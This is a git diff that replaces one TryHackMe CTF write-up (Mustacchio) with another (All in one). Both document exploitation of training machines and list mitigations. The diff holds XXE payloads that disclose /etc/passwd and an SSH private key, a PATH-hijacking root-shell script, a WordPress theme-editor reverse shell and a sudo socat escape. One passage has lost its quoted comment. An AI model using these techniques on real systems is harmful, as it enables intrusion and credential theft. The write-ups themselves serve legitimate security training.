@@ -1,245 +1,144 @@
-# Mustacchio Tryhackme CTF - Writeup
+# All in one CTF (Tryhackme)
 
-## Target Information
+Target IP: 10.66.191.155\
+Difficulty: Easy&#x20;
 
-* IP Address: 10.65.171.253
-* Operating System: Ubuntu Linux
-* Difficulty: Easy
-* Machin link :[https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)
-
-***
+Link of room:[https://tryhackme.com/room/allinonemj](https://tryhackme.com/room/allinonemj)\
+Author: Oussama Zehri \
+Category: Web Exploitation, Cryptography, Privilege Escalation
 
 {% stepper %}
 {% step %}
-### Recon & Enumeration
+### Phase I: Reconnaissance & Enumeration
 
-#### I use Nmap as port scanner
+Every successful breach starts with solid intel. Since this was a CTF environment, I opted for an aggressive Nmap scan to quickly map the attack surface.
 
-Command used:
-
+{% code title="nmap_scan.txt" %}
 ```bash
-nmap -sC -sV -p- 10.65.171.253
-```
-
-Open ports & services:
-
-| Port | Service | Version       |
-| ---- | ------- | ------------- |
-| 22   | SSH     | OpenSSH 7.2p2 |
-| 80   | HTTP    | Apache 2.4.18 |
-| 8765 | HTTP    | Nginx 1.10.3  |
-
-Observation:
-
-* Two different web servers (Apache & Nginx) running on the same host — often indicates separated services or different application logic.
-{% endstep %}
-
-{% step %}
-### Web Enumeration – Port 80 (Apache)
-
-* Website title: Mustacchio | Home
-* robots.txt exists but contains no useful paths.
-
-Using ffuf a backup file was discovered:
-
-* /users.bak
-
-Inspecting the file revealed database-related data, including a username and password hash:
-
-```
-admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
-```
-{% endstep %}
-
-{% step %}
-### Hash Cracking
-
-* Hash length: 40 characters → identified as SHA1
-
-Command used with Hashcat:
-
-```bash
-hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-```
-
-Recovered password:
-
-* bulldog19
-{% endstep %}
-
-{% step %}
-### Admin Panel – Port 8765 (Nginx)
-
-* Logged into the admin panel using: admin / bulldog19
-
-Inside the source code, the following comment was found:
-
-```html
-<!-- Barry, you can now SSH in using your key! -->
-```
-
-This confirms:
-
-* SSH access is restricted to key-based authentication
-* Password login is disabled
-{% endstep %}
-
-{% step %}
-### XXE Injection – Initial Access
-
-The admin panel accepts XML input and was vulnerable to XML External Entity (XXE) injection.
-
-Proof of XXE (Local File Disclosure):
-
-{% code title="" %}
-```
-xxe /etc/passwd
+nmap -T4 -sCV -A 10.66.191.155 -oN nmap_scan.txt
 ```
 {% endcode %}
 
-```xml
-<?xml version="1.0"?>
+Open Ports & Services
 
-<!DOCTYPE comment [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
+| Port | Service | Version       | Notes                    |
+| ---: | ------- | ------------- | ------------------------ |
+|   21 | FTP     | vsftpd 3.0.5  | Anonymous Login Enabled. |
+|   22 | SSH     | OpenSSH 8.2p1 | Standard Ubuntu SSH.     |
+|   80 | HTTP    | Apache 2.4.41 | Hosting a WordPress CMS. |
 
-<comment>
-  <name>test</name>
-  <author>test</author>
-  <com>&xxe;</com>
-</comment>
-```
+{% hint style="info" %}
+Red Team Note: While Anonymous FTP was open, a manual inspection yielded no sensitive files. I immediately pivoted to the Web entry point.
+{% endhint %}
+{% endstep %}
 
-Sensitive system data was returned, confirming the vulnerability.
+{% step %}
+### Phase II: Web Discovery
 
-Targeted Barry’s SSH private key:
+I initiated a directory brute-force using Gobuster to find hidden endpoints.
 
-{% code title="xxe /home/barry/.ssh/id_rsa" %}
-```vb
-xxe /home/barry/.ssh/id_rsa
+{% code title="gobuster" %}
+```bash
+gobuster dir -u http://10.66.191.155/ -w /usr/share/wordlists/dirb/common.txt
 ```
 {% endcode %}
 
-```xml
-<?xml version="1.0"?>
+Key Findings:
 
-<!DOCTYPE comment [
-  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
-]>
+* /wordpress/: A standard WP installation.
+* /hackathons/: A custom page containing interesting source code comments.
 
-<comment>
-  <name>admin</name>
-  <author>admin</author>
-  <com>&xxe;</com>
-</comment>
-```
+#### The Hidden Breadcrumb
 
-The private key was successfully disclosed.
+Inspecting the source code of /hackathons/ revealed a cryptic comment:\
+and.\
+This pattern suggested a Vigenère Cipher. In real-world engagements, developers often leave "reminders" in comments that serve as the keys to the kingdom.
 {% endstep %}
 
 {% step %}
-### SSH Access
+### Phase III: Initial Access
 
-* The private key was protected with a passphrase.
-* The passphrase was cracked using John the Ripper.
+#### Cracking the Vigenère
 
-SSH command used:
+Using the clues found on the site, I decrypted the string. The result provided the administrative credentials needed for the WordPress dashboard.
+
+#### Exploiting WordPress (RCE)
+
+With Admin access to WordPress, the path to a shell is straightforward via the Theme Editor:
+
+* Navigate to Appearance > Theme Editor.
+* Select `functions.php`.
+* Inject a PHP reverse shell payload.
+* Set up a listener: `nc -nvlp 4444`.
+
+Callback Received:
 
 ```bash
-ssh -i id_rsa barry@10.65.171.253
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
-Initial foothold achieved.
 {% endstep %}
 
 {% step %}
-### Privilege Escalation
+### Phase IV: Lateral Movement
 
-Searched for SUID binaries:
+A www-data shell is restricted. I searched for files associated with the user `elyana`:
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+find / -user elyana 2>/dev/null
 ```
 
-Interesting binary found:
+Discovery: `/etc/mysql/conf.d/private.txt`\
+This file contained the plaintext password for `elyana`. Using this, I upgraded my session:
 
-* /home/joe/live\_log
-
-Binary analysis:
-
-* Owned by root
-* SUID bit set
-*   The binary uses system() to execute:
-
-    ```
-    tail -f /var/log/nginx/access.log
-    ```
-* tail is called without an absolute path → leads to PATH hijacking vulnerability.
+* `sudo su elyana` (or via SSH using the recovered credentials)
 {% endstep %}
 
 {% step %}
-### PATH Hijacking Exploitation
+### Phase V: Privilege Escalation (Root)
 
-Steps performed on the target:
-
-Create a malicious tail binary:
+To reach the top of the food chain, I checked for sudo misconfigurations:
 
 ```bash
-cd /tmp
-echo -e '#!/bin/bash\n/bin/bash -p' > tail
-chmod +x tail
+sudo -l
 ```
 
-Modify PATH to include /tmp first:
+#### The Vulnerability
+
+`elyana` was permitted to run `/usr/bin/socat` as root without a password.
+
+#### The Exploit (GTFOBins Style)
+
+Socat is a powerful networking tool that can be abused to execute a shell with elevated privileges.
 
 ```bash
-export PATH=/tmp:$PATH
+sudo /usr/bin/socat stdin exec:/bin/sh
 ```
 
-Execute the SUID binary:
+Outcome:
 
 ```bash
-/home/joe/live_log
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Result: Root shell obtained.
-
-HERE WE GOO YESS !!! we are th SYS OWNER
-
-&#x20;
+System Compromised.
 {% endstep %}
 
 {% step %}
-### xd
+### Phase VI: Post-Mortem & Remediation
 
-<figure><img src=".gitbook/assets/hack-vibe.jfif" alt=""><figcaption></figcaption></figure>
+#### What I Learned
+
+* Vigenère Awareness: Cryptographic obfuscation in CTFs often relies on classic ciphers. Recognizing these patterns saves hours of fruitless brute-forcing.
+* The Power of Sudo: A single binary like `socat` can render all other security layers useless if sudo permissions are too broad.
+
+#### Mitigation Strategies
+
+* Secure Sudoers: Never grant sudo access to binaries that have "shell escape" capabilities (check GTFOBins).
+* Code Sanitization: Remove all developer comments and credentials from production source code.
+* Disable File Editing: Disable the WordPress Theme/Plugin editor by adding `define( 'DISALLOW_FILE_EDIT', true );` to `wp-config.php`.
 {% endstep %}
 {% endstepper %}
 
 ***
-
-## Key Takeaways
-
-* Vulnerabilities identified:
-  * Exposed backup files (.bak)
-  * Weak password hashing (SHA1)
-  * XML External Entity (XXE)
-  * Improper SUID binary configuration
-  * PATH Hijacking
-
-{% hint style="info" %}
-This machine highlights how small misconfigurations chained together can lead to full system compromise: information disclosure → XXE → SSH key extraction → privilege escalation.
-{% endhint %}
-
-## Mitigations (Real‑World)
-
-* Disable external entities in XML parsers.
-* Never expose backup or sensitive files.
-* Use strong password hashing (bcrypt / argon2).
-* Avoid custom SUID binaries.
-* Always use absolute paths in privileged programs.
-
-## Final Notes
-
-Each step in this chain relied on poor security practices rather than complex exploits.
